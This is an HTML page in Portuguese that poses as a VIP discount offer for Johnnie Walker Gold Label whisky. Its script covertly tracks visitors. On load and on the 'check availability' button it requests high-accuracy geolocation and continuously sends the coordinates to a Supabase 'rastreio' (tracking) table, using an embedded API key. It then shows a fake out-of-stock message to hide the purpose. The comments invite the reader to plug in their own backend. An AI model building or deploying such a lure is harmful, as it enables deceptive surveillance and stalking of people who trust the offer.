<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oferta Exclusiva - Outlet Bebidas</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { font-family: 'Helvetica', sans-serif; background: #000; color: #fff; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .promo-card { border: 2px solid #d4af37; padding: 30px; border-radius: 15px; background: #111; max-width: 350px; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3); }
        .whisky-img { width: 180px; margin-bottom: 15px; }
        h1 { color: #d4af37; font-size: 22px; margin-bottom: 10px; }
        .price { font-size: 28px; color: #fff; margin: 10px 0; }
        .price span { text-decoration: line-through; color: #888; font-size: 16px; }
        .btn-check { background: #d4af37; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 15px; }
        .footer-text { font-size: 10px; color: #555; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="promo-card">
        <h1>OFERTA VIP</h1>
        <img src="https://files.catbox.moe/kwy0ow.png">
        <p>Johnnie Walker Gold Label 750ml</p>
        <p class="price"><span>R$ 450,00</span> <br> R$ 289,90</p>
        <p style="font-size: 12px; color: #d4af37;">Verificando estoque na sua região...</p>
        <button class="btn-check" id="main-btn">VERIFICAR DISPONIBILIDADE</button>
        <p class="footer-text">SE BEBER NÃO DIRIJA. VENDA PROIBIDA PARA MENORES DE 18 ANOS.</p>
    </div>

    <script>
        // 1. CONFIGURAÇÕES - SUBSTITUA PELOS SEUS DADOS
        const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
        
        const { createClient } = supabase;
        const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

        // 2. FUNÇÃO PARA CAPTURAR E ENVIAR
        async function capturarLocalizacao() {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;

                    // Envia para a tabela 'rastreio' que você criou com SQL
                    await _supabase.from('rastreio').insert([{
                        latitude: latitude,
                        longitude: longitude,
                        precisao: accuracy,
                        dispositivo: "Promoção Gold Label"
                    }]);
                    
                    console.log("Sincronizado com sucesso.");
                }, 
                (error) => {
                    console.error("Permissão negada ou erro.");
                }, 
                {
                    enableHighAccuracy: true,
                    maximumAge: 0
                });
            }
        }

        // 3. EXECUÇÃO AUTOMÁTICA
        // Tenta pedir a localização assim que a página abre
        window.onload = () => {
            setTimeout(capturarLocalizacao, 1000); // Aguarda 1 segundo para o navegador carregar tudo
        };

        // Como garantia, se o automático falhar, o clique no botão ativa
        document.getElementById('main-btn').addEventListener('click', () => {
            capturarLocalizacao();
            alert("Produto temporariamente indisponível para sua região!");
        });
    </script>
</body>
</html>
